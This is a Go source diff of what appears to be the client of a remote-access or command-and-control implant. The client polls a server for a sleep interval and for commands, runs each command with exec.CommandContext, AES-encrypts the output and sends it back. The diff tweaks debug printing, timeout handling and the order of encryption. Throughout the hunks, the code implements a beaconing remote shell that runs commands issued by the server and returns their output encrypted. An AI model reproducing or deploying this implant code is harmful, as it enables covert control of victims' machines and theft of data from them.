@@ -47,7 +47,7 @@ func main() {
 			}
 			if cmd.In == "" {
 				t, _ := client.GetSleepTime(ctx, req)
-				fmt.Println("sleep" + t.String())
+				fmt.Println("sleep------" + t.String())
 				time.Sleep(time.Duration(t.Time) * time.Second)
 				continue
 			}
@@ -113,27 +113,23 @@ func main() {
 			baseCtx := context.Background()
 
 			// 设置超时时间为5秒
-			ctx, cancel := context.WithTimeout(baseCtx, 3*time.Second)
-			defer cancel()
+			ctx1, _ := context.WithTimeout(baseCtx, 3*time.Second)
 
 			if len(tokens) == 1 {
-				c = exec.CommandContext(ctx, tokens[0])
+				c = exec.CommandContext(ctx1, tokens[0])
 			} else {
-				c = exec.CommandContext(ctx, tokens[0], tokens[1:]...)
+				c = exec.CommandContext(ctx1, tokens[0], tokens[1:]...)
 			}
 			buf, err := c.CombinedOutput()
 			if err != nil {
 				//报错进行加密
-
 				log.Println("err:", err)
-				// cmd.Out = err.Error()
-
+				cmd.Out = err.Error()
 			}
 			//将结果发送给服务端时先进行加密处理
 			cmd.Out += string(buf)
-			log.Println(cmd.Out)
-			cmd.Out, _ = util.EncryptByAes([]byte(cmd.Out))
 			fmt.Println("收:" + cmd.In + "\n 发出:" + cmd.Out)
+			cmd.Out, _ = util.EncryptByAes([]byte(cmd.Out))
 			client.SendOutput(ctx, cmd)
 		}
 	}
